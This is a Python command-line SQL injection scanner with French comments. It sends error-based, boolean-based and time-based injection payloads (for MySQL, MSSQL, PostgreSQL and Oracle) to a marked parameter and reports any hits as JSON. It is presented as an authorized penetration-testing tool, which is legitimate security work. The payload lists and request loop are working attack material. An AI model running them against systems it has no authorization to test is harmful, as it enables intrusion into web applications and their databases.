#!/usr/bin/env python3
"""
=============================================================================
 sqli_detector.py — Détection d'injection SQL (error/boolean/time-based)
=============================================================================
 Auteur   : [votre nom]
 Version  : 1.0
 OS       : Windows / macOS / Linux (Python 3.8+)
 Dépend.  : requests

 DESCRIPTION
 -----------
 Teste une URL ou un endpoint POST pour détecter des injections SQL via :
   - Error-based   : messages d'erreur DB dans la réponse HTML
   - Boolean-based : différences de taille/contenu entre TRUE et FALSE
   - Time-based    : délai supérieur au seuil (SLEEP/WAITFOR/pg_sleep)

 Marquer le paramètre à tester avec le mot "INJECT" dans l'URL ou --data.

 USAGE
 -----
   python sqli_detector.py [options]

 EXEMPLES
 --------
   python sqli_detector.py --url "https://site.com/item?id=INJECT"
   python sqli_detector.py --url "https://site.com/login" --method POST \
       --data "user=admin&pass=INJECT"
   python sqli_detector.py --url "https://site.com/search?q=INJECT" \
       --type error,boolean -o sqli.json

 OPTIONS
 -------
   --url        URL cible (utiliser INJECT comme marqueur de paramètre)
   --method     GET (défaut) ou POST
   --data       Données POST (ex: "user=admin&pass=INJECT")
   --type       Types : error, boolean, time, all (défaut: all)
   --timeout    Timeout en secondes (défaut: 10)
   --time-thresh Seuil de délai pour time-based en secondes (défaut: 5)
   --no-verify  Désactiver la vérification SSL
   --cookie     Cookie de session (ex: "PHPSESSID=abc123")
   -o, --output Fichier JSON de sortie

 AVERTISSEMENT LÉGAL
 -------------------
 Utilisez uniquement sur des applications que vous êtes autorisé à tester.
=============================================================================
"""

import argparse
import json
import re
import sys
import time
import urllib.parse
from datetime import datetime

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[ERREUR] Installez 'requests' : pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

def green(t):  return f"{Fore.GREEN}{t}{Style.RESET_ALL}" if COLOR else t
def yellow(t): return f"{Fore.YELLOW}{t}{Style.RESET_ALL}" if COLOR else t
def red(t):    return f"{Fore.RED}{t}{Style.RESET_ALL}" if COLOR else t
def cyan(t):   return f"{Fore.CYAN}{t}{Style.RESET_ALL}" if COLOR else t
def bold(t):   return f"{Style.BRIGHT}{t}{Style.RESET_ALL}" if COLOR else t
def dim(t):    return f"{Style.DIM}{t}{Style.RESET_ALL}" if COLOR else t

MARKER = "INJECT"

# ─── Payloads ────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "1'",
    "1\"",
    "1`",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR '1'='1",
    "') OR ('1'='1",
    "1; SELECT 1",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 99--",
]

BOOLEAN_PAYLOADS = [
    ("1 AND 1=1", "1 AND 1=2"),   # true / false
    ("1 OR 1=1",  "1 OR 1=2"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("1' AND '1'='1", "1' AND '1'='2"),
]

TIME_PAYLOADS = [
    "1; WAITFOR DELAY '0:0:5'--",               # MSSQL
    "1' WAITFOR DELAY '0:0:5'--",
    "1; SELECT SLEEP(5)--",                      # MySQL
    "1' AND SLEEP(5)--",
    "1 AND SLEEP(5)",
    "1; SELECT pg_sleep(5)--",                   # PostgreSQL
    "1' AND 1=(SELECT 1 FROM pg_sleep(5))--",
    "1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',5); END;--",  # Oracle
]

DB_ERROR_PATTERNS = [
    re.compile(p, re.IGNORECASE) for p in [
        r"sql syntax",
        r"you have an error in your sql",
        r"warning.*mysql",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"ORA-\d{4,5}",
        r"microsoft.*odbc.*sql server",
        r"odbc.*driver.*sql server",
        r"sqlstate",
        r"pg_query.*:.*error",
        r"PSQLException",
        r"SQLiteException",
        r"syntax error.*unexpected",
        r"division by zero",
        r"invalid column name",
        r"column.*does not exist",
    ]
]

# ─── Helpers ─────────────────────────────────────────────────────────────────

def inject(template: str, payload: str) -> str:
    return template.replace(MARKER, urllib.parse.quote(payload, safe=""))


def make_request(session, method, url_tmpl, data_tmpl, payload,
                 timeout, verify, cookies):
    url  = inject(url_tmpl, payload)
    data = inject(data_tmpl, payload) if data_tmpl else None
    try:
        t0 = time.time()
        if method == "POST":
            resp = session.post(url, data=data, timeout=timeout,
                                verify=verify, cookies=cookies)
        else:
            resp = session.get(url, timeout=timeout, verify=verify, cookies=cookies)
        elapsed = time.time() - t0
        return resp, elapsed
    except requests.exceptions.Timeout:
        return None, timeout
    except Exception as e:
        return None, 0


def has_db_error(text: str) -> str | None:
    for pattern in DB_ERROR_PATTERNS:
        m = pattern.search(text)
        if m:
            return m.group(0)
    return None

# ─── Tests ───────────────────────────────────────────────────────────────────

def test_error_based(session, url, data, method, timeout, verify, cookies) -> list[dict]:
    findings = []
    print(f"\n  {bold('[ Error-based ]')}")
    for payload in ERROR_PAYLOADS:
        resp, _ = make_request(session, method, url, data, payload, timeout, verify, cookies)
        if resp is None:
            continue
        err = has_db_error(resp.text)
        if err:
            print(f"  {red('[VULN]')} payload={payload!r}  erreur={dim(err[:60])}")
            findings.append({
                "type":    "error-based",
                "payload": payload,
                "evidence": err,
            })
        else:
            print(f"  {dim('[ok]')} {dim(payload[:40])}")
    return findings


def test_boolean_based(session, url, data, method, timeout, verify, cookies) -> list[dict]:
    findings = []
    print(f"\n  {bold('[ Boolean-based ]')}")
    for true_pl, false_pl in BOOLEAN_PAYLOADS:
        r_true,  _ = make_request(session, method, url, data, true_pl,  timeout, verify, cookies)
        r_false, _ = make_request(session, method, url, data, false_pl, timeout, verify, cookies)
        if r_true is None or r_false is None:
            continue
        len_true  = len(r_true.text)
        len_false = len(r_false.text)
        diff = abs(len_true - len_false)
        if diff > 50:  # différence significative
            print(f"  {red('[VULN]')} true={true_pl!r} | false={false_pl!r} | diff={diff}B")
            findings.append({
                "type":    "boolean-based",
                "true_payload":  true_pl,
                "false_payload": false_pl,
                "size_diff":     diff,
            })
        else:
            print(f"  {dim('[ok]')} diff={diff}B  {dim(true_pl[:30])}")
    return findings


def test_time_based(session, url, data, method, timeout, thresh, verify, cookies) -> list[dict]:
    findings = []
    print(f"\n  {bold('[ Time-based ]')}")
    for payload in TIME_PAYLOADS:
        resp, elapsed = make_request(session, method, url, data, payload,
                                     timeout + 6, verify, cookies)
        marker = red(f"[VULN] {elapsed:.2f}s") if elapsed >= thresh else dim(f"[ok] {elapsed:.2f}s")
        print(f"  {marker}  {dim(payload[:50])}")
        if elapsed >= thresh:
            findings.append({
                "type":    "time-based",
                "payload": payload,
                "elapsed": round(elapsed, 2),
            })
    return findings

# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Détection d'injection SQL (error/boolean/time-based)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url",        required=True)
    parser.add_argument("--method",     default="GET", choices=["GET", "POST"])
    parser.add_argument("--data",       default="", help="Données POST avec INJECT")
    parser.add_argument("--type",       default="all",
                        help="error,boolean,time,all (défaut: all)")
    parser.add_argument("--timeout",    type=int, default=10)
    parser.add_argument("--time-thresh",type=float, default=5.0)
    parser.add_argument("--no-verify",  action="store_true")
    parser.add_argument("--cookie",     default="")
    parser.add_argument("-o", "--output")
    args = parser.parse_args()

    if MARKER not in args.url and MARKER not in args.data:
        print(yellow(f"[AVERT] Le marqueur '{MARKER}' est absent de --url et --data."))

    types = {t.strip() for t in args.type.split(",")}
    run_all = "all" in types
    cookies = dict(c.split("=", 1) for c in args.cookie.split(";") if "=" in c) if args.cookie else {}
    verify  = not args.no_verify

    print(cyan("=" * 65))
    print(cyan("  SQLi Detector"))
    print(cyan(f"  URL    : {args.url[:60]}"))
    print(cyan(f"  Method : {args.method}"))
    print(cyan("=" * 65))

    session  = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (SQLi-Audit; authorized-pentest)"
    all_findings = []

    if run_all or "error" in types:
        all_findings += test_error_based(session, args.url, args.data,
                                         args.method, args.timeout, verify, cookies)
    if run_all or "boolean" in types:
        all_findings += test_boolean_based(session, args.url, args.data,
                                           args.method, args.timeout, verify, cookies)
    if run_all or "time" in types:
        all_findings += test_time_based(session, args.url, args.data, args.method,
                                        args.timeout, args.time_thresh, verify, cookies)

    print(f"\n{cyan('─'*65)}")
    if all_findings:
        print(red(f"  [!] {len(all_findings)} vecteur(s) SQLi détecté(s) !"))
    else:
        print(green("  Aucune injection SQL détectée."))
    print(cyan("─" * 65))

    if args.output:
        out = {
            "timestamp": datetime.now().isoformat(),
            "url":       args.url,
            "method":    args.method,
            "vulnerable": bool(all_findings),
            "findings":  all_findings,
        }
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2, ensure_ascii=False)
        print(green(f"\n[+] Rapport : {args.output}"))


if __name__ == "__main__":
    main()
